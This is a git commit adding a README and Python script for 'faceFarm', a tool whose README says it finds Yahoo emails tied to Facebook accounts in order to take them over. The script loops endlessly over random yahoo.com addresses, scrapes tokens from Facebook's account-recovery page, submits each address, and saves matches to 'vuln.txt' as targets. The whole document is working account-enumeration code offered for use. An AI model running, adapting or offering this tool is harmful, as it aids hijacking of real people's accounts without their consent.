1dace022557d5015a3cfcc7ebc05a051efa9bc74
fdjrr <fadjrir.co.id@gmail.com>
2022-01-07 16:21:43 +0700

    first commit

---
+++ README.md
@@ -0,0 +1,41 @@
+# faceFarm &ndash; The simple Email Detector.
+**Email Valid Detector for Facebook (Yahoo)**
+
+faceFarm is an active yahoo email detection script that functions to take over the facebook account using email. This script is famous for cloning old facebook accounts.
+
+- Fast and Accurate.
+- ✨ Greats! and Magic ✨
+
+## Features
+
+- Using Faker module.
+- Using Yahoo email for checking email. (default).
+
+## Installation
+
+faceFarm requires [Python](https://python.org/) v.3.10+ to run. 
+
+Install the dependencies and start the script.
+
+```sh
+git clone https://github.com/fdjrr/facefarm.git
+cd facefarm
+python -m pip install -r requirements.txt
+python app.py
+```
+
+## Plugins
+
+faceFarm is currently extended with the following plugins.
+Instructions on how to use them in your own application are linked below.
+
+| Plugin | README |
+| ------ | ------ |
+| Faker from pypi.org | https://pypi.org/project/Faker/ |
+| BeautifulSoup from pypi.org | https://pypi.org/project/bs4/ |
+
+## Licenses
+
+MIT &ndash; **Free Software, Hell Yeah!**
+
+Thanks you for Fadjrir Herlambang as Developer.
---
+++ app.py
@@ -0,0 +1,78 @@
+from bs4 import BeautifulSoup
+from faker import Faker
+import requests
+
+
+class faceFarm():
+    def __init__(self) -> None:
+        super(faceFarm, self).__init__()
+        self.requests = requests.Session()
+        pass
+
+    def request(self, method, url, **kwargs):
+        try:
+            return self.requests.request(method, url, timeout=(10, 30), **kwargs)
+        except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout) as e:
+            return e
+
+    def identifyEmail(self, email):
+        url = "https://m.facebook.com/login/identify/"
+        page = self.request("GET", url, params={
+            "ctx": "recover",
+            "c": "/login/",
+            "search_attempts": "1",
+            "ars": "facebook_login",
+            "alternate_search": "0",
+            "show_friend_search_filtered_list": "0",
+            "birth_month_search": "0",
+            "city_search": "0"
+        })
+        soup = BeautifulSoup(page.text, "html.parser")
+        lsd = soup.find("input", {"name": "lsd"})["value"]
+        jazoest = soup.find("input", {"name": "jazoest"})["value"]
+
+        page = self.request("POST", url, params={
+            "ctx": "recover",
+            "c": "/login/",
+            "search_attempts": "1",
+            "ars": "facebook_login",
+            "alternate_search": "0",
+            "show_friend_search_filtered_list": "0",
+            "birth_month_search": "0",
+            "city_search": "0"
+        }, data={
+            "lsd": lsd,
+            "jazoest": jazoest,
+            "email": email,
+            "did_submit": "Cari"
+        })
+        soup = BeautifulSoup(page.text, "html.parser")
+        login_identify_search_error_msg = soup.find(
+            "div", {"id": "login_identify_search_error_msg"})
+        if not login_identify_search_error_msg:
+            status = soup.find("title").get_text()
+            print(
+                "[*] Email Address : {}\n[*] Status : {}\n[+] Saved to 'vuln.txt'.\n".format(email, status))
+            with open("vuln.txt", "a", encoding="utf-8") as fp:
+                fp.write(email + "\n")
+        else:
+            status = soup.find("title").get_text()
+            detail_status = login_identify_search_error_msg.get_text()
+            print("[*] Email Address : {}\n[*] Status : {}\n[*] Detail Status : {}\n".format(
+                email, status, detail_status))
+            pass
+
+
+if __name__ == "__main__":
+    faceFarmASCII = """    __             ___               
+  / _|__ _ __ ___| __|_ _ _ _ _ __  
+ |  _/ _` / _/ -_) _/ _` | '_| '  \ 
+ |_| \__,_\__\___|_|\__,_|_| |_|_|_|
+faceFarm - Email Detector for Facebook    
+    """
+    print(faceFarmASCII)
+    faceFarm = faceFarm()
+    while True:
+        fake = Faker()
+        emailAddr = fake.email().split("@")[0] + "@yahoo.com"
+        faceFarm.identifyEmail(emailAddr)
